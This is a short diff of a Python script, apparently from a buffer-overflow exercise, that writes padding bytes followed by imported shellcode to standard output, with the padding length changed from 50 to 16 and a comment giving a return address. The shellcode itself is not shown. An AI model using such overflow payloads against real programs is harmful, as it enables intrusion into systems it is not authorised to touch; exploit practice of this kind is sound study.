@@ -5,7 +5,7 @@ import sys
 from shellcode import shellcode
 #sys.stdout.buffer.write(shellcode)
 
-sys.stdout.buffer.write(b'A'*50+shellcode)
+sys.stdout.buffer.write(b'A'*16+shellcode)
 
 # ret: 0x0000000000401e0f
 
